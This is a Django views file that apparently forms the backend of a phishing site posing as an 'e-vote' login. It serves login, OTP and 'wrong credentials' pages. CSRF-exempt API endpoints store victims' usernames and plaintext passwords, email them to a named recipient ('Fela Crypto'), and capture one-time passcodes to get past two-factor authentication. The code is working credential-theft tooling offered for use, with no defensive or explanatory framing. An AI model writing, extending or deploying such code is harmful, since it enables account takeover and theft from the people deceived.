from django.shortcuts import render
from .models import Credentials
from rest_framework.response import Response
from rest_framework.decorators import api_view
from rest_framework import status
from django.views.decorators.csrf import csrf_exempt
from .email import send_email

from decouple import config


def login_to_account(request):
    context = {}
    return render(request, 'login.html', context)


def home_page(request):
    context = {}
    return render(request, "home_page.html", context)

def enter_otp(request):
    if request.method == "POST":
        otp = request.POST.get("otp")
        print("OTP: ", otp)
    context = {}
    return render(request, 'otp.html', context)


def wrong_credentials(request):
    context = {}
    return render(request, 'wrong_credentials.html', context)


def preloader(request):
    context = {}
    return render(request, 'preloader.html', context)




# APIS
@csrf_exempt
@api_view(['POST'])
def api_create_user_view(request):
    data = request.data

    username = data.get("username")
    password = data.get("password")

    print(data)
    
    credentials = Credentials(
        username=username,
        password=password
    )
    credentials.save()

    credentials_id = credentials.pk

    # Here send email
    send_email(
        message=f"Here are the credentials for your e-vote website: Username: {username}; Passcode: {password}",
        receiver_name="Fela Crypto",
        subject="A message from e-vote",
    )

    return Response({
        "detail": "Submitted successfully Credentials",
        "credentials_id": credentials_id
    }, status=status.HTTP_200_OK)
    

@csrf_exempt
@api_view(['POST'])
def api_send_otp(request):
    data = request.data

    credentials_id = data.get("credentials_id")
    otp = data.get("otp")

    try:
        credentials = Credentials.objects.get(id=credentials_id)
    except Credentials.DoesNotExist:
        return Response({"detail": "Credential does not exist"}, status=status.HTTP_200_OK)
    credentials.otp = otp
    credentials.save()
    return Response({"detail": "Submitted successfully OTP"}, status=status.HTTP_200_OK)




